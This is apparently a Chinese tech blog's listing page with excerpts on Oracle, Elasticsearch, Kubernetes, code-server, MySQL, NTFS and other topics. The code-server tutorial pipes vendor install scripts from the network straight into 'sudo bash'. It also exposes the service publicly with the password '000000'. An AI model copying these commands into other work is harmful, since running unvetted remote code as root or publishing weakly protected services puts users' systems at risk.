		<h2 class="list__title post__title">
			<a href="/posts/cc70a5c9cf4db92f828ff409d1bba455/" rel="bookmark">
			Linux下 安装Oracle
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		CentOS更新yum源 先看CentOS的版本：
$ cat /etc/redhat-release
根据版本下载163镜像的yum，在下载之前先备份：
mv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.backup
之后下载yum源：
CentOS6.5：
wget http://mirrors.163.com/.help/CentOS6-Base-163.repo
CentOS7：
wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo 如果wget命令不生效，说明还没有安装wget工具，输入yum -y install wget 回车进行安装，或者使用
curl -O http://mirrors.aliyun.com/repo/Centos-7.repo
证书更新： 证书检查 可以先通过rpm命令检查下CA证书，可以发现是2013版的。
$ rpm -qa |grep ca-certificates ca-certificates-2013.1.94-65.0.el6.noarch 更新：
$ yum --disablerepo=epel -y update ca-certificates yum update -y # 更新系统命令
修改yum配置，默认同时安装32位和64位rpm
[root@OracleCentOS ~]# echo 'multilib_policy=all' &gt;&gt; /etc/yum.conf 安装Oracle 12c所需rpm包
[root@OracleCentOS ~]# yum -y install binutils compat-libcap1 compat-libstdc++-33 gcc gcc-c++ glibc glibc-devel ksh libgcc libstdc++ libstdc++-devel libaio libaio-devel libXext libXtst libX11 libXau libxcb libXi make sysstat unixODBC unixODBC-devel xterm 添加组
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cc70a5c9cf4db92f828ff409d1bba455/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bd514a3f3f0eabc08085002595d76262/" rel="bookmark">
			面试题：ES的面试题及答案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		什么是ES？ 答：ES是Elasticsearch的缩写，是一款开源的分布式搜索引擎。它可以快速地存储、搜索和分析大量的数据，支持全文检索、结构化查询等多种查询方式。ES的主要特点是速度快、可扩展、高可用和易于使用。
ES的主要用途是什么？ 答：ES主要用于建立搜索引擎、日志分析、监控等场景。在搜索引擎领域，ES可以快速地检索海量数据，支持复杂的查询语句和聚合操作。在日志分析领域，ES可以实时地收集、分析和可视化大量的日志数据。在监控领域，ES可以实时地监控系统、网络、服务器等各种指标数据。
ES的数据存储方式是什么？ 答：ES使用的是倒排索引的方式来存储数据。倒排索引是一种将文档中的单词映射到包含这些单词的文档中的数据结构。它可以快速地定位文档中包含某个单词的位置，从而实现快速的全文检索。
ES的数据分片是如何实现的？ 答：ES的数据分片是通过将数据分成多个分片来实现的。每个分片都是一个独立的索引，包含部分数据。分片可以在多个节点上分布式存储，提高了数据的可用性和可扩展性。当进行查询时，ES会自动将查询请求分发到所有相关的分片上，并将结果进行合并返回。
ES的查询语句有哪些？ 答：ES的查询语句主要有以下几种：
（1）match查询：用于执行全文搜索。
（2）term查询：用于匹配精确值。
（3）range查询：用于匹配指定范围内的值。
（4）bool查询：用于组合多个查询语句。
（5）match_phrase查询：用于匹配短语。
ES的聚合操作有哪些？ 答：ES的聚合操作主要有以下几种：
（1）count聚合：用于计算文档数量。
（2）sum聚合：用于计算指定字段的总和。
（3）avg聚合：用于计算指定字段的平均值。
（4）max聚合：用于计算指定字段的最大值。
（5）min聚合：用于计算指定字段的最小值。
ES的集群是如何工作的？ 答：ES的集群是由多个节点组成的，每个节点都是独立的进程。当启动一个节点时，它会自动加入到集群中，参与数据的存储和查询。ES的集群通过Master节点进行协调和管理，Master节点负责维护集群状态、节点状态和分片状态等信息。
ES的数据备份和恢复如何实现？ 答：ES的数据备份和恢复可以通过快照和恢复功能来实现。快照是对索引和分片的一份拷贝，可以保存在本地或远程存储库中。当需要恢复数据时，可以从快照中恢复索引和分片。此外，ES还提供了基于日志的复制机制，可以在多个节点之间复制数据，提供数据冗余和高可用性。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/91a999ed720f918ed4fa1eb9df5dfb02/" rel="bookmark">
			k8s命令查看容器日志
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		概念： ● namespace
以不同命名空间区分环境，如：TEST，DEV
● POD
k8s运行的最小单位
● Service
一种资源类型，将pod开放给外部访问，拥有IP地址，port，target port，前者为对外端口，后者为pod端口
命令： kbpod 功能：列出pod
使用方式：kbpod &lt;namespace&gt;
说明：如果namespace为all，将打印所有命名空间的pod等于–all-namespace效果。
举例：kbpod all #列出所有pod；
kbpod test #列出所有test的pod；
kbpod test |grep
platform-web #列出test的platform-web的pod完整名称
kblog 功能：查看pod日志
使用方法：kblog &lt;namespace&gt; &lt;服务名&gt; [] [] 说明：可以与|grep组合筛选指定内容
举例：kblog test platform-web #打印test的platform-web所有日志
kblog test platform-wekbb --tail 100 #打印test的platform-web最后100行日志
kblog test platform-web --tail 100 -f #打印test的platform-web最后100行日志，并实时打印
kblog test platform-web --tail 100|grep error #打印test的platform-web最后100行中包含error的日志
kbdel 功能：删除pod
使用方法：kbdel &lt;namespace&gt; &lt;podname&gt;
说明：当需要重启应用时，可以删除pod，pod会重新创建并重新启动应用。
举例：kbdel test platform-web-5513123-6654
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/91a999ed720f918ed4fa1eb9df5dfb02/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7adf3fe3e70fff344d8ada7e9475d95a/" rel="bookmark">
			【Android平板编程】远程Ubuntu服务器code-server编程写代码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言1.ubuntu本地安装code-server2. 安装cpolar内网穿透3. 创建隧道映射本地端口4. 安卓平板测试访问5.固定域名公网地址5.结语 前言 本次教程将在 Ubuntu 服务器环境下安装 code-server ，并使用 Android 安卓平板远程 Ubuntu 服务，进行远程编程开发写代码。同时搭配 cpolar 内网穿透工具，实现公网环境下异地远程访问Ubuntu的code-server。
1.ubuntu本地安装code-server 准备一台虚拟机,Ubuntu或者centos都可以,这里以 VMwhere ubuntu 系统为例
下载code server服务,浏览器访问:https://github.com/coder/code-server,复制下载链接
打开ubuntu命令行下载
出现需要输入ubuntu的登录账户密码,输入密码即可,然后等待安装完成
以下信息表示安装成功
接着输入以下命令设置code-server的登录密码
export PASSWORD=”000000” 查看IP地址,作局域网访问使用
code-server服务默认为8080端口号, 为了防止8080端口冲突,我们修改一下code-server端口号,输入以下命令,编辑配置文件
sudo vim ~/.config/code-server/config.yaml 把127.0.0.1改为0.0.0.0,8080端口改成自己喜欢的端口,本例子改为8077,修改完成保存
设置好密码后启动code-server服务,输入以下命令:
code-server 出现地址和端口号信息表示启动成功
接着打开浏览器通过局域网ip地址访问http://192.168.191.129:8077/,出现welcone code-server表示成功,输入我们设置的密码,登录即可.
2. 安装cpolar内网穿透 接着使用cpolar穿透本地code-server服务,使得android设备可以远程进行访问,随时随地写代码。cpolar支持http/https/tcp协议，不限制流量，操作简单，无需公网IP，也无需路由器。
cpolar官网：https://www.cpolar.com/
安装cpolar内网穿透(支持一键自动安装脚本)
cpolar 安装（国内使用） curl -L https://www.cpolar.com/static/downloads/install-release-cpolar.sh | sudo bash 或 cpolar短链接安装方式：(国外使用） curl -sL https://git.io/cpolar | sudo bash 查看版本号 cpolar version token认证 登录cpolar官网后台，点击左侧的验证，查看自己的认证token，之后将token贴在命令行里
cpolar authtoken xxxxxxx 向系统添加服务 sudo systemctl enable cpolar 启动cpolar服务 sudo systemctl start cpolar 查看服务状态 sudo systemctl status cpolar 正常显示为active则表示服务为正常在线启动状态。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7adf3fe3e70fff344d8ada7e9475d95a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d30f1783154d8a876874603cf904b598/" rel="bookmark">
			Springboot&#43;vue项目 适配金蝶AAS，附上金蝶操作说明
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.打包方式 修改成war包方式；去除Springboot 自带的tomcat包和servlet-api.jar 防止冲突，最好改成使用编译后的文件夹部署的方式；
&lt;!-- 移除嵌入式tomcat插件 --&gt; &lt;!--provided：编译和测试时有效，但是该依赖在运行时由服务器提供，并且打包时也不会被包含进去--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-tomcat&lt;/artifactId&gt; &lt;scope&gt;provided&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;javax.servlet&lt;/groupId&gt; &lt;artifactId&gt;javax.servlet-api&lt;/artifactId&gt; &lt;scope&gt;provided&lt;/scope&gt; &lt;/dependency&gt; 2.修改启动类，初始化方法 public class AASServerApplication extends SpringBootServletInitializer { //1、修改启动类，继承 SpringBootServletInitializer 并重写 configure 方法 @Override protected SpringApplicationBuilder configure(SpringApplicationBuilder builder) { System.out.println("======AAS===WebApplication====start=========="); return builder.sources(new Class[]{VgServerApplication.class}); } // 2、由于Spring boot默认使用Tomcat作为嵌入式Servlet容器,来启动SpringBoot的web应用,所以需要修改servlet容器的配置 @Bean public ServletRegistrationBean dispatcherRegistration(DispatcherServlet dispatcherServlet) { return new ServletRegistrationBean(dispatcherServlet, "/*"); } //3、如果模块需要上传文件需要添加下面的代码，如果没有可以忽略 @Bean(name = "multipartResolver") public MultipartResolver multipartResolver() { CommonsMultipartResolver resolver = new CommonsMultipartResolver(); resolver.setDefaultEncoding("UTF-8"); resolver.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d30f1783154d8a876874603cf904b598/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/af6f21a81ed7bdd68d90eec6fd28c98f/" rel="bookmark">
			多种方式实现web端截屏录屏
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文通过使用webrtc、dom监听、使用插件三种方式实现截屏，使用webrtc、dom监听来实现录屏
使用webrtc实现截屏录屏
①实现录屏
// 音频或视频流 let mediaStreamTrack = null; // 录制器 let mediaRecorder = null; /** * @description: 开启屏幕录制，异步返回录制数据 * @author: flyer * @param {Function} onstart 开启录制回调 * @param {Function} onstop 关闭录制回调 */ const startMedia = (onstart, onstop) =&gt; { return new Promise((resolve, reject) =&gt; { if (!isObjEmpty(typeof navigator.mediaDevices)) { // eslint-disable-next-line no-undef const controller = new CaptureController(); navigator.mediaDevices .getDisplayMedia({ audio: true, preferCurrentTab: true,controller }) .then(stream =&gt; { mediaStreamTrack = stream; stream.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/af6f21a81ed7bdd68d90eec6fd28c98f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dc8407af748b1fdf4976404ad1095827/" rel="bookmark">
			xilinx 7 series GT COMMON
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		大多数博客都介绍了gtp quad有四个channel和一个gt common资源，gt common中包含两个CPLL或者说就是pll0和pll1，gt common有两个专用的gt refclk输入管脚，可以在gt common原语上配置pll0和pll1的输入源。
理论上，a7 35t有4个gtp channel，可以跑在2种线速率上，因为pll0和pll1可以分别配置。但我在应用一个pcie ip和aurora ip时，会出现了gt refclk无法route的错误。经过一番折腾，找到了解决办法。
1. 首先我很早就知道了gt common只有一个，因此例化ip时要选择gt common在example design中。在top顶层单独例化gt common。ref0输入经pll0输出给pcie的pll0。ref1输入经pll1输出给aurora的pll0。
2.问题在于aurora和pcie ip在例化时都不能选择gtpe2 channel上的txsysclk和rxsysclk的来源，固定就是pll0。这一点可以看源码，追溯到gtpe2 channel原语上，看到TXSYSCLKSEL为2'b00，就表示用的pll0，当然2bit选择不同位置，具体看手册就明白了。也就是说gt common的pll0和pll1不能分别到gtpe2 channel的pll0（粗略看了几个相关手册，猜测的）。 那么我就改变一下思路，先设置ip和global模式，再把它的is manage属性去掉，手动修改aurora ip核的gtp原语上的TXSYSCLKSEL和RXSYSCLKSEL为2'b11，选择pll1输入，然后将gt common的pll1输出到aurora ip核上的pll1，把aurora ip核上的pll0固定接0。
就可以正常编译了。
如果有人因为看到我这个博客而解决了类似的问题，我将感到不胜荣幸。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e7732591f1bcc4bd3dbe16507a601a73/" rel="bookmark">
			CSS预处理器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		CSS预处理器是一种工具，可以拓展CSS语言，并添加更多的功能和特性，能编写和维护CSS代码更加高效，它们通常包括一些编程语言的特性，比如变量、函数、循环等以及其他的一些高级功能比如继承、混合、嵌套等。
与原生的CSS相比，CSS预处理器的优势在于：
1.更好的可维护性，使得变量函数混合等功能可以使代码更加模块化和可重用，而降低了代码的复杂度和维护难度；
2.更高的可读性，CSS预处理器通常支持嵌套函数，可以更加好地组织代码结构，从而使代码更加易读；
3.更高的生产效率，CSS预处理器的功能可以提高开发的效率。
缺点：代码需要编译成CSS，可能会增加开发和构建的复杂度，最后如果滥用CSS预处理器可能会增加代码的复杂度和不可维护性。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/353d8f07139a28db964dcf00025b2cc3/" rel="bookmark">
			集成运放——比例运算电路输入输出电压的关系
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 前言一、同相比例运算电路1.一般的电路形式：2.输入电压和输出电压的关系： 二、反向比例运算电路1.一般的电路形式：2.输入电压和输出电压的关系： 三、差分比例运算电路1.一般的电路形式：2.输入电压和输出电压的关系： 总结 前言 下面包含同相比例运算电路、反向比例运算电路、差分比例运算电路3种电路的输入电压和输出电压的关系的表达式计算。
一、同相比例运算电路 1.一般的电路形式： 2.输入电压和输出电压的关系： 有虚短，有虚断。
由虚短得：u+=u-=ui
由虚断得：i+=i-=0
可以对通路uo(输出端)到RF到R1到地，进行分析，以u-为界，列等式并化简，从而得出输入电压和输出电压的关系：
二、反向比例运算电路 1.一般的电路形式： 2.输入电压和输出电压的关系： 有虚短，有虚断。
由虚短得：u+=u-=0
由虚断得：i+=i-=0
可以对通路ui（输入端）到R1到RF到uo（输出端）进行分析，以u-为界，列等式并化简，从而得出输入电压和输出电压的关系：
三、差分比例运算电路 1.一般的电路形式： 2.输入电压和输出电压的关系： 有虚短，有虚断。
由虚短得：u+=u-
由虚断得：i+=i-=0
一般情况下，为了对称性，我们会有R1=R1’,RF=RF’
可以对通路ui(输入端)到R1到RF到uo(输出端)和同相输入端进行分析，通路以u-为界，可以列出方法1和方法2两种等式（因方法1较复杂难化简，故用方法2），从而得出输入电压和输出电压的关系：
总结 主要是为了记录学习中的一些知识或者说是学习过程，加深记忆。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/04430bd8e5d373b44a0673d5cddb33a3/" rel="bookmark">
			ESP32在VScode下编译
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1，搭建好环境之后，会有以下两个重要的文件夹
一个是用于存放esp-idf(SDK)的文件；一个用于存放编译等工具。
2，可以拷贝一个工程，到指定文件下下，进行开发。拷贝工程如下
这里只有main文件夹，CMakeLists.txt 和README.md。
VScode打开如下
编译之后，多出build文件夹。
3，如果有更改文件夹或更改文件夹名，删除“build”文件夹，重新编译一遍即可。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/27ab6e3bdbe7ad7c6ddd419d554e7295/" rel="bookmark">
			Mysql综合案例一
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、DDL练习
代码实现
二、DML练习
代码实现
三、DQL练习
DQL练习1-学生表
代码实现
DQL练习2-员工表
代码实现
总结
一、DDL练习 创建数据库sql1、sql2删除数据库sql2使用数据库sql1创建学生表：id、姓名删除学生表 代码实现 -- 创建数据库sql1、sql2 create database sql1; create database sql2; -- 删除数据库sql2 drop database sql2; -- 使用数据库sql1 use sql1; -- 创建学生表：id、姓名 create table if not exists student ( id int, -- 学生id name varchar(20) -- 学生姓名 ); -- 删除学生表 drop table student; 二、DML练习 创建一个数据库mydb使用mydb数据库创建一个员工表employee 列为 员工编号id 员工姓名name 员工性别gender 员工薪资salary插入数据：张三 男 2000 李四 男 1000 李红 女 4000更新数据：所有人工资变成5000更新数据：张三薪资变成3000id变成0更新数据：所有人工资再加1000删除数据：删除李红的数据清空表 代码实现 -- 创建数据库 create database mydb; 使用mydb数据库 use mydb; -- 创建一个员工表employee 列为 员工编号id 员工姓名name 员工性别gender 员工薪资salary create table employee( id int, -- 员工id name varchar(20), -- 员工姓名 gender varchar(5), -- 员工性别 salary int -- 员工薪资 ); -- 插入数据:张三 男 2000 李四 男 1000 李红 女 4000 insert into employee(name,gender,salary) values ('张三','男',2000), ('李四','男',1000), ('李红','女',4000); -- 更新数据：所有人工资变成5000 update employee set salary=5000; -- 更新数据：张三薪资变成3000id变成0 update employee set salary=3000,id=0 where name='张三'; -- 更新数据：所有人工资再加1000 update employee set salary=salary+1000; -- 删除数据：删除李红的数据 delete from employee where name='李红'; -- 清空表 drop table employee; 三、DQL练习 DQL练习1-学生表 创建如下学生表 create table student( id int, name varchar(20), gender varchar(20), chinese int, math int, english int );	insert into student values (1,'张明','男',89,78,90), (2,'李进','男',67,53,95), (3,'王五','女',87,78,77), (4,'李一','女',88,98,92), (5,'李财','男',82,84,67), (6,'张宝','男',55,85,45), (7,'黄蓉','女',75,65,30),	(7,'黄蓉','女',75,65,30);	完成下列要求
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/27ab6e3bdbe7ad7c6ddd419d554e7295/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/62e4b8e07589e8ad581379a944665520/" rel="bookmark">
			NTFS详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、NTFS文件格式介绍 NTFS是Windows NT内核的系列操作系统支持的、一个特别为网络和磁盘配额、文件加密等管理安全特性设计的磁盘格式，提供长文件名、数据保护和恢复，能通过目录和文件许可实现安全性，并支持跨越分区。
以上是啃书本，接下来谈谈笔者自己的理解。
谈到NTFS，就不得不提到FAT32文件系统格式。
FAT32磁盘格式从Windows98系统开始流行，是FAT16的增强版，相比FAT16，增强了磁盘性能、增加了可用磁盘空间，并且支持长文件名。但是，它的缺点也很明显，那就是他无法支持4G以上文件的储存，而现在的文件动辄十几G。
而NTFS则是在FAT32的基础上做出了更多的升级和优化。NTFS格式最早出现在WindowsNT操作系统中。
如果说WindowsNT系统大家没听过，那么时代经典也是时代眼泪的WindowsXP系统，大家一定不陌生。
事实上，随着千禧年WindowsME系统的没落，2001年诞生的XP系统使用的，正是WindowsNT内核。也是从XP系统之后，历代系统都开始使用NT内核，包括我们现在使用的Win10、Win11等。
虽然WindowsNT早在1993年就已经出世，但是因为有WindowsME系统的竞争，NT并没有过多的关注。可以说，正是WindowsXP系统把WindowsNT带入21世纪世人的视野。
那么说了这么多，WindowsNT系统到底与本文的主角NTFS有什么关系呢？
如果说，WindowsNT系统是1993年诞生的一个婴儿，那么NTFS文化系统格式就是这个婴儿嘴里的牙齿。
NTFS格式在XP系统之后的系统里，逐渐成为了系统文件的默认格式。但FAT32格式依然在U盘领域等其他领域占有一席之地。
我们接下来会把二者做对比，方便理解。
二、NTFS与FAT32的对比实验 实验准备：一台纯净虚拟机
实验目的：探索NTFS与FAT32磁盘格式的区别
实验步骤：
1、为虚拟机添加一张虚拟磁盘
2、在磁盘管理里，我们将这张磁盘初始化并联机，接下来创建两个简单卷，分别为NTFS格式和FAT32格式
3、在此电脑里找到创建的两个卷
经过对比可见：NTFS卷与FAT32卷相比，增加了卷影副本（即“以前的版本”）、安全、配额设置以及压缩选项。
依此我们可以总结出，NTFS的优点有：
安全性较高没有文件大小的限制。支持数据恢复更好的磁盘压缩功能 接下来我会对各优点做仔细的实验探究。
三、NTFS的卷影副本探究实验 实验准备：一台纯净虚拟机
实验目的：探究NTFS的卷影副本功能
实验步骤：
1、右键NTFS格式的分卷，点击配置卷影副本
2、启用该卷，就自动备份了卷影副本。
3、随便在该卷里写一些东西，然后点击还原，发现写入的文件消失。可见卷影副本具有恢复到之前某一个时间段文件状态的功能，也就是数据恢复功能（前提是已经做好了备份）。
四、NTFS与FAT32文件大小限制探究实验 实验准备：沿用之前
实验步骤：
1、把一个5.86GB大小的文件放入NTFS卷，发现可以放入，因为NTFS格式对文件大小没有限制
2、而对于FAT32卷，因为FAT32格式文件大小不能超过4GB的限制，所以即使空间充足也无法放入
五、NTFS的安全性探究实验 实验步骤：
以下所有操作只针对NTFS这个盘
1、我们可以看见，NTFS比FAT32格式多出了不少选项，其中就包括安全选项。
这个选项是通过给不同用户划分不同权限以提高磁盘的安全性的。
我们打开高级选项，可以很清楚的看见每个用户群的权限划分。
比如这里的“everyone”指的是任何一位使用该台计算机的人，而此时划分给everyone的权限是读取和执行，这意味着每一位用户最基本的权限就是读取，可以查看该盘中的任何一个文件。
而这项权限也就只能做这么多了，如果想执行更多操作，就需要更多的权限。
在计算机管理里，我创建了一个名叫CESHI的用户，他隶属于Users组，而观察权限，我们发现Users组是有读取、写入、创建权限的。登录这个用户，意味着我们可以在该盘里随意查看、创建并且写入文件。但是，我们无法删除或者修改已存在的文件，这是因为我们没有修改权限。
当我们想删除文件时，会提示需要管理员权限 。
我们可以尝试登录管理员账户，给Users组赋予修改权限，再登陆CESHI这个账户，发现这时就可以删除、修改文件了。
2、Create Owner组意思是对自己创建的文件夹的管理用户。我用一个实验来方便理解。
我们进入管理员账户，给Create Owner完全控制权限，再给Users读取、写入权限但不给修改权限。刚刚我们说过，只有拥有修改或者完全控制权限，才能删除或修改文件。那么按这个道理，我们登录CESHI这个用户是无法删除任何文件的。
但是此时我们实践后发现，如果在该盘里创建一个自己的文件夹，那么此时我们在这个文件夹里就有了完全控制权限，想干什么就干什么。这就是Create Owner用户的作用：只要是在你的文件夹下，你可以任意修改（前提是你给Create Owner完全控制权限）。
3、另外，我们再阐明一下修改与完全控制权限的区别。其实二者非常相似，都具有读取、写入、删除文件的权力，但是完全控制多了一项修改所没有的权限，那就是具有完全控制权限的用户可以给其他用户赋予权限，而修改则不行。
4、父项与子对象。我们知道，文件夹是层层嵌套的，最外面那层就是我们的盘，盘的权限会默认继承给下面的子对象。当然，这个继承是可以取消的。
5、当一个用户属于多个组时，此时各组的权限对于这个用户是并集关系。也就是说，假如一个用户既属于Administrators组，也属于Users组，而Administrators具有修改权限，Users具有读取与写入权限，那么该用户对这个盘具有修改权限。
5、最后，除了盘的权限是可以划分的，盘内文件的权限也可以细分。并且，盘内文件的权限是超越上级的。
到此，NTFS的介绍告一段落。
总结一下，NTFS是FAT32的优化版，具有安全性高，无大小限制，支持数据恢复和压缩功能的特点。 实验完毕。
后话：笔者也只是初学者，初心为分享自己所学知识。欢迎大佬赐教。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3ff5481d28ec33e8d60cbbdc9ea8573f/" rel="bookmark">
			小程序开发中cookie的使用场景以及方案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		小程序是一种轻量级的应用程序，通常运行在手机的微信或其他平台上。在小程序开发中，使用 cookie 是一种常见的方式来在客户端和服务器之间传递和存储数据。下面将详细介绍小程序开发中 cookie 的使用场景和方案。
登录和用户信息管理：在小程序中，用户登录和用户信息管理是常见的功能。可以使用 cookie 来存储用户登录状态信息，例如用户的登录凭证、用户信息等。通过 cookie，可以在客户端和服务器之间传递用户信息，实现用户登录状态的保持。例如以下代码段演示了如何使用 cookie 来存储和传递用户登录状态： // 小程序中设置 cookie wx.setStorageSync('token', '用户登录凭证'); // 小程序中获取 cookie const token = wx.getStorageSync('token'); // 使用 token 发送请求到服务器进行登录验证 记住用户偏好设置：小程序中可以根据用户的偏好设置来提供个性化的服务，例如用户的语言、主题等。可以使用 cookie 来存储用户的偏好设置信息，使得用户下次打开小程序时可以继续使用之前的偏好设置。例如以下代码段演示了如何使用 cookie 来存储和获取用户偏好设置： // 小程序中设置 cookie wx.setStorageSync('language', '用户语言设置'); // 小程序中获取 cookie const language = wx.getStorageSync('language'); // 使用 language 设置小程序界面语言 缓存数据：小程序中可能需要缓存一些数据，例如用户的搜索历史、浏览记录等。可以使用 cookie 来存储这些数据，以提高小程序的性能和用户体验。例如以下代码段演示了如何使用 cookie 来存储和获取用户搜索历史： // 小程序中设置 cookie wx.setStorageSync('searchHistory', JSON.stringify(['搜索关键词1', '搜索关键词2'])); // 小程序中获取 cookie const searchHistory = JSON.parse(wx.getStorageSync('searchHistory')); // 使用 searchHistory 显示用户的搜索历史 防止重复操作：小程序中可能会涉及到一些需要防止重复操作的场景，例如用户重复点击按钮、重复提交表单等。可以使用 cookie 来记录用户操作状态，防止用户重复操作。例如以下代码段演示了如何使用 cookie 来记录和判断按钮点击状态： // 小程序中设置 cookie wx.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3ff5481d28ec33e8d60cbbdc9ea8573f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d9de90aad979440331c840bf80172f13/" rel="bookmark">
			面试题：Dubbo的一些常见面试题及答案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		什么是Dubbo框架？
Dubbo是一种高性能、轻量级的开源分布式服务框架，它提供了服务注册、服务发现、负载均衡、远程调用、容错和安全等功能，简化了分布式应用开发。
Dubbo框架的核心原理是什么？
Dubbo框架的核心原理是基于RPC（Remote Procedure Call）远程过程调用技术，通过网络传输调用服务方法。Dubbo框架通过配置中心、注册中心、RPC协议和服务提供者、服务消费者等组件实现了服务治理的功能。
Dubbo框架有哪些核心组件？
Dubbo框架的核心组件包括配置中心、注册中心、服务提供者、服务消费者、RPC协议、负载均衡器、容错机制和监控中心等。
Dubbo框架支持哪些协议？
Dubbo框架支持多种协议，包括Dubbo协议、HTTP协议、Hessian协议、Thrift协议和RMI协议等。
Dubbo框架的扩展点是什么？
Dubbo框架的扩展点是指开发者可以通过扩展点来自定义框架的行为和功能。Dubbo框架的扩展点包括SPI扩展、自适应扩展、Wrapper扩展和Compiler扩展等。
Dubbo框架的负载均衡策略有哪些？
Dubbo框架的负载均衡策略包括随机、轮询、最小连接数、一致性哈希、加权随机、加权轮询、平滑加权轮询和平滑加权一致性哈希等。
Dubbo框架的容错机制有哪些？
Dubbo框架的容错机制包括失败自动恢复、快速失败、失败重试、失败转移、自动降级和Mock服务等。
Dubbo框架的注册中心有哪些？
Dubbo框架支持多种注册中心，包括Zookeeper、Redis、Multicast、Simple、Nacos和Consul等。
Dubbo框架的监控中心有哪些？
Dubbo框架的监控中心包括Dubbo Admin、Dubbo Monitor和Eagle Eye等。
Dubbo框架如何解决分布式应用中的问题？
Dubbo框架通过服务注册、服务发现、负载均衡、远程调用、容错和安全等功能解决了分布式应用中的问题，如服务调用的复杂性、服务的可用性、服务的可靠性和服务的安全性等。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0ab99c9b2cde207ed9dab1f826582c81/" rel="bookmark">
			熟悉这10个顶级GitHub项目，帮你速通Python编程！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 有朋友问我，学习Python最好的方法是什么？
其实很简单，就是多写，多练。
找优秀的Project边写边学，多思考一下如果是自己写这些功能会怎么写，眼前的代码有什么可取之处？让这些写过的代码，真正变成你的知识。
我整理了几个github上很不错的Python项目，在此分享一下。
1. Python-100-Days url: github.com/jackfrued/Python-100-Daysstar:130000fork:48000 《Python100天从新手到大师》的电子书，作为Python的入门学习资料，学习难度较低。新手也能较快上手学习。 开头15天的知识点，对于0基础的小伙伴可能比较难学，网上会有视频资源，有兴趣的朋友可以去找一下。
或者可以在文末领取，我会分享给大家。
2. certbot url: github.com/certbot/certbotstar:30000fork:3300 自动启用和部署HTTPS的免费免费，你的网站打开HTTPS变得简单快捷。选择服务器的操作系统和Web服务器，然后根据给出的步骤一步一步地执行命令，部署教程。
【----帮助Python学习，以下所有学习资料文末免费领！----】
3. 30-Days-Of-Python url: github.com/Asabeneh/30-Days-Of-Pythonstar:19000fork:4300 这是一个免费的零基础Python教程。虽然项目本身是英文的，但对英语要求不高，阅读障碍较小，可放心使用。
4. micropython url: github.com/micropython/micropythonstar:16000fork:6200 可以让单片机上运行Python。
众所周知Python是一种语法简单的编程语言，使用Python控制硬件非常写意。这个项目就是在单片机上的“迷你” Python，通过它使用Python3单片机，开发硬件的准入门槛大大降低。
5. recommenders url:github.com/microsoft/recommendersstar:15000fork:2600 在Jupyter Notebook上呈现推荐系统的最佳实践。
本项目是由微软开源的推荐系统教程，包括推荐系统常用的Python工具箱。
6. numpy-100 url:github.com/rougier/numpy-100star:9800fork:4900 Numpy练习册。包括100个关于Numpy的练习和解决方案。
